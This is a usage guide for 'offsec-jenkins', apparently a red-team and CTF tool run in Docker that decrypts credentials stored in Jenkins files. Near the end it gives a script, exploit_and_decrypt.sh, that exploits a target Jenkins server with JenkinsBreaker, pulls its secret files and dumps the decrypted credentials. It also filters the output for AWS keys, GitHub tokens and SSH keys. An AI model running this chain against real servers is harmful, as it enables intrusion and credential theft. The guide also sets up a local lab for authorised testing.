# Docker Usage Guide

## Overview

offsec-jenkins now supports Docker for portable, isolated execution across any platform.

**Key Features**:
- ✅ No local Python installation required
- ✅ Consistent environment across Windows/Linux/macOS
- ✅ Volume mounts for Jenkins file access
- ✅ No hardcoded credentials (user-specified only)
- ✅ CTF and red team optimized

---

## Quick Start

### 1. Build the Image

```bash
docker-compose build offsec-jenkins
```

Or use Docker directly:
```bash
docker build -t offsec-jenkins:latest .
```

### 2. Prepare Jenkins Files

Place your extracted Jenkins files in `./jenkins_files/`:
```
jenkins_files/
├── master.key
├── hudson.util.Secret
└── credentials.xml
```

### 3. Run Decryption

**Redacted output** (default):
```bash
docker-compose run --rm offsec-jenkins --path /data
```

**Revealed secrets** (CTF/authorized testing):
```bash
docker-compose run --rm offsec-jenkins --path /data --reveal-secrets
```

**Export to JSON**:
```bash
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot.json \
  --reveal-secrets \
  --force
```

Output files are written to `./outputs/` on your host machine.

---

## Usage Examples

### Example 1: Basic Decryption
```bash
# Place files in jenkins_files/
cp extracted/master.key jenkins_files/
cp extracted/hudson.util.Secret jenkins_files/
cp extracted/credentials.xml jenkins_files/

# Decrypt (redacted)
docker-compose run --rm offsec-jenkins --path /data
```

### Example 2: CTF Speed Run
```bash
# Quick decrypt and export
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot.json \
  --reveal-secrets \
  --force

# Analyze output
cat outputs/loot.json | jq '.[] | select(.decrypted | contains("AKIA"))'
```

### Example 3: Explicit File Paths
```bash
docker-compose run --rm offsec-jenkins \
  --key /data/master.key \
  --secret /data/hudson.util.Secret \
  --xml /data/credentials.xml \
  --reveal-secrets
```

### Example 4: Recursive Scanning
```bash
# Scan entire directory tree
docker-compose run --rm offsec-jenkins \
  --scan-dir /data \
  --export-json /outputs/all_secrets.json \
  --reveal-secrets \
  --force
```

### Example 5: Dry-Run Mode
```bash
# Test without decrypting
docker-compose run --rm offsec-jenkins \
  --path /data \
  --dry-run
```

### Example 6: CSV Export
```bash
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-csv /outputs/report.csv \
  --reveal-secrets \
  --force

# Open in Excel or LibreOffice
```

---

## Advanced Usage

### Using Docker Without docker-compose

**Build**:
```bash
docker build -t offsec-jenkins:latest .
```

**Run with volume mounts**:
```bash
docker run --rm \
  -v $(pwd)/jenkins_files:/data:ro \
  -v $(pwd)/outputs:/outputs \
  offsec-jenkins:latest \
  --path /data --reveal-secrets
```

**Windows PowerShell**:
```powershell
docker run --rm `
  -v ${PWD}/jenkins_files:/data:ro `
  -v ${PWD}/outputs:/outputs `
  offsec-jenkins:latest `
  --path /data --reveal-secrets
```

### Custom Volume Paths

Mount Jenkins files from any location:
```bash
docker run --rm \
  -v /path/to/jenkins/files:/data:ro \
  -v /path/to/output:/outputs \
  offsec-jenkins:latest \
  --path /data --export-json /outputs/loot.json --reveal-secrets
```

### CTF One-Liner

```bash
docker run --rm \
  -v $(pwd)/jenkins_loot:/data:ro \
  offsec-jenkins:latest \
  --path /data --reveal-secrets | grep -E "AKIA|ghp_|ssh-rsa"
```

---

## Jenkins Lab (Optional Testing)

The docker-compose includes an optional Jenkins lab for testing. **No credentials are hardcoded**.

### Start Jenkins Lab

```bash
docker-compose --profile lab up -d jenkins-lab
```

Access Jenkins at http://localhost:8080

**Initial Setup**:
1. Navigate to http://localhost:8080
2. Retrieve initial admin password:
   ```bash
   docker exec jenkins-lab cat /var/jenkins_home/secrets/initialAdminPassword
   ```
3. Complete setup wizard and create admin user with YOUR chosen credentials

### Configure Test Credentials

Once logged in:
1. Go to **Manage Jenkins** → **Manage Credentials**
2. Add credentials (AWS keys, GitHub tokens, SSH keys, passwords)
3. Extract Jenkins files for testing:
   ```bash
   docker cp jenkins-lab:/var/jenkins_home/secrets/master.key jenkins_files/
   docker cp jenkins-lab:/var/jenkins_home/secrets/hudson.util.Secret jenkins_files/
   docker cp jenkins-lab:/var/jenkins_home/credentials.xml jenkins_files/
   ```
4. Test decryption:
   ```bash
   docker-compose run --rm offsec-jenkins --path /data --reveal-secrets
   ```

### Stop and Clean Up

```bash
# Stop Jenkins lab
docker-compose --profile lab down

# Remove all data (DESTRUCTIVE)
docker-compose --profile lab down -v
```

---

## Security Notes

### No Hardcoded Credentials ✅

Unlike some Jenkins lab setups, this Docker configuration:
- ❌ Does NOT hardcode admin/admin
- ❌ Does NOT auto-configure weak credentials
- ✅ Requires users to set their own credentials
- ✅ Follows security best practices

### OPSEC Considerations

**Default Redaction**:
- Secrets are redacted by default
- Must explicitly use `--reveal-secrets` flag
- Prevents accidental exposure in logs/screenshots

**Read-Only Mounts**:
- Input files mounted as read-only (`:ro`)
- Tool cannot modify original Jenkins files
- Safe for forensic analysis

**Isolated Environment**:
- Decryption happens in isolated container
- No host system dependencies
- Clean removal with `docker-compose down`

---

## Troubleshooting

### Permission Denied on Output Files

If output files have wrong permissions:
```bash
# Run with user ID
docker run --rm \
  -v $(pwd)/jenkins_files:/data:ro \
  -v $(pwd)/outputs:/outputs \
  --user $(id -u):$(id -g) \
  offsec-jenkins:latest \
  --path /data --export-json /outputs/loot.json --reveal-secrets
```

### Files Not Found

Ensure files are in the correct location:
```bash
# Check volume mount
docker run --rm -v $(pwd)/jenkins_files:/data:ro alpine ls -la /data

# Should show:
# master.key
# hudson.util.Secret
# credentials.xml
```

### Docker Not Available

If Docker is not installed:
```bash
# Use native Python instead
python decrypt.py --path jenkins_files --reveal-secrets
```

---

## Integration with JenkinsBreaker

### Complete Workflow

**Step 1**: Exploit Jenkins with JenkinsBreaker
```bash
cd JenkinsBreaker
python3 JenkinsBreaker.py --url http://target:8080 --extract-all
```

**Step 2**: Copy files to Docker volume
```bash
cp extracted/* ../offsec-jenkins/jenkins_files/
```

**Step 3**: Decrypt with Docker
```bash
cd ../offsec-jenkins
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot.json \
  --reveal-secrets \
  --force
```

**Step 4**: Analyze results
```bash
cat outputs/loot.json | jq '.'
```

### Automated Script

Create `exploit_and_decrypt.sh`:
```bash
#!/bin/bash
TARGET=$1

if [ -z "$TARGET" ]; then
  echo "Usage: $0 <jenkins-url>"
  exit 1
fi

# Exploit
cd JenkinsBreaker
python3 JenkinsBreaker.py --url "$TARGET" --extract-all --output ../offsec-jenkins/jenkins_files

# Decrypt
cd ../offsec-jenkins
docker-compose run --rm offsec-jenkins \
  --path /data \
  --export-json /outputs/loot_$(date +%Y%m%d_%H%M%S).json \
  --reveal-secrets \
  --force

echo "[+] Decryption complete. Check outputs/ directory."
```

Usage:
```bash
chmod +x exploit_and_decrypt.sh
./exploit_and_decrypt.sh http://target-jenkins:8080
```

---

## Platform Compatibility

| Platform | Status | Notes |
|----------|--------|-------|
| **Linux** | ✅ Full support | Native Docker |
| **macOS** | ✅ Full support | Docker Desktop |
| **Windows** | ✅ Full support | Docker Desktop or WSL2 |
| **WSL2** | ✅ Full support | Use Linux Docker or Windows Docker |
| **Kali Linux** | ✅ Full support | Native Docker |
| **Parrot OS** | ✅ Full support | Native Docker |

---

## Performance

Docker overhead is minimal:
- **Build time**: ~30 seconds
- **Startup time**: <1 second
- **Decryption speed**: Identical to native Python
- **Memory usage**: ~50MB container overhead

For CTF competitions, Docker is fast enough for real-time operations.

---

## Summary

✅ **Docker support implemented**  
✅ **No hardcoded credentials** (user-specified only)  
✅ **Full CLI feature support**  
✅ **Volume mounts for flexibility**  
✅ **Cross-platform compatibility**  
✅ **CTF and red team optimized**  
✅ **JenkinsBreaker integration ready**

The tool maintains its offline-first, security-focused design while adding Docker portability.
